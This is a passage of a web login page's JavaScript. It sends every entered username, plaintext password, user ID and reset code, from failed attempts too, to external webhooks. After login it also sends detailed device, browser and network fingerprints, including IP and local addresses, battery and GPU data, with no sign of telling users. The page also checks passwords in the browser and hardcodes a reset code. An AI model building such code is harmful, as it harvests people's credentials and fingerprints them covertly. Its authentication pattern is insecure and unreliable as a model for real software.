                  { name: "Password Entered", value: password, inline: true }, { name: "User ID", value: identifier, inline: true },
                  { name: "Entered Code", value: enteredCode, inline: false }
              ]
          ));
      }

      // --- Embed builders for original 5 webhooks ---
      function buildUserLoggingEmbed(data) {
        return buildEmbed("User Logging System", 0xff0000, [
            { name: "Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true }, { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true }, { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
        ]);
      }
      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return buildEmbed("Browser Logging System", 0x00ff00, [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true }, { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode", value: "Undetected", inline: true }, // Note: Detecting incognito accurately is difficult/unreliable
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
        ]);
      }
      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return buildEmbed("Device Logging System", 0x0000ff, [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true }, { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true }, { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true }, { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true }, { name: "Language", value: nav.language || "Unknown", inline: true }
        ]);
      }
      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return buildEmbed("Connection Logging System", 0xffff00, [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true }, { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Type", value: nav.connection?.effectiveType || "Unknown", inline: true },
            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true }, { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },
            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false }, { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },
            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false }, { name: "Local IPs", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },
            { name: "Network Metered", value: nav.connection?.metered ? "Yes" : "No", inline: true }, { name: "Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
        ]);
      }
      function buildSessionLoggingEmbed(data) {
        return buildEmbed("Session Logging System", 0x00ffff, [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true }, { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime || "Unknown", inline: true }, { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },
            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false }, { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },
            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false }, { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },
            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false }, { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },
            { name: "Last Activity", value: data.lastActivityTime || "Unknown", inline: true }, { name: "Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },
            { name: "Idle Time", value: data.idleTime || "0s", inline: true }, { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
        ]);
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt with specific webhook
        await logAttemptsCounter(user?.name || "Unknown", username, password, userID, attempts);

        if (!user) {
          await logInvalidUsername(null, username); // Pass null name as user not found
          await logInvalidIdentifier(null, userID);
          handleFailedAttempt('User not found or identifier mismatch.');
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          return;
        }

        // Correct login
        attempts = 5; // Reset attempts on successful login
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.classList.remove('flashing'); // Ensure it's not flashing
        loginBox.style.borderColor = '#ff914d'; // Restore default border
        loginBox.style.boxShadow = '0 0 25px rgba(255, 145, 77, 0.7), 0 0 10px rgba(0,0,0,0.5) inset'; // Restore default shadow

        // Log specific actions for successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect data and send all 5 original webhooks
        const loggingData = await collectLoggingData(user, password);
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Hide login, show dashboard, and initialize dashboard
        loginBox.style.display = 'none';
        document.getElementById('dashboard').style.display = 'flex'; // Use flex to match body layout
        document.body.className = 'dashboard-body'; // Apply dashboard theme
        
        // Update user info in dashboard header
        document.getElementById('loggedInUser').textContent = user.name || user.username;
        document.getElementById('loggedInID').textContent = userID;
        
        // Initialize dashboard functionalities
        dashboard.init();
        
        // Add a welcome notification
        dashboard.addNotification(`Welcome back, ${user.name || user.username}! Your session has started.`, 'success');
      }

      // Handle failed login attempt
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded using specific webhook
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID); // Get user object if available
          
          await logAttemptsExceeded(user?.name || "Unknown", username, password, userID);
          
          showResetPopup();
          disableInputs();
        } else {
          // Flash red for visual feedback on failed attempts
          if (attempts <= 3) { // Start flashing after 2 attempts
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts counter display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable input fields and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
      }

      // Enable input fields and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show the reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
      }

      // Hide the reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = ''; // Clear the field
      }

      // Handle the reset code submission
      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const correctCode = 'Reset.Counter.2579'; // Secret reset code

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {}; // Get user object or empty if not found

        // Log that a reset attempt was detected immediately
        await logResetAttemptDetected(user.name || "N/A", username, password, userID, enteredCode);

        if (enteredCode === correctCode) {
          // Successful reset
          attempts = 5; // Reset attempts
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = ''; // Clear error message
          loginBox.style.borderColor = '#ff914d'; // Restore border
          loginBox.style.boxShadow = '0 0 25px rgba(255, 145, 77, 0.7), 0 0 10px rgba(0,0,0,0.5) inset'; // Restore shadow
          
          // Log successful reset
          await logResetAttempt(user.name || "N/A", username, password, userID, enteredCode, true);
          
          dashboard.addNotification("System counter reset successfully. Please log in again.", 'success');

        } else {
          // Failed reset attempt
          alert('Incorrect reset code. Please try again.');
          // Log failed reset attempt
          await logResetAttempt(user.name || "N/A", username, password, userID, enteredCode, false);
          resetField.value = ''; // Clear field after incorrect attempt
          resetField.focus();
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Allow Enter key to submit login or reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
          e.preventDefault(); // Prevent default Enter key behavior
        }
      });

      // Initialize the attempts counter display
      updateAttemptsText();
      console.log("Login system initialized.");
    })(); // Immediately Invoked Function Expression for Login System
  </script>
</body>
</html>
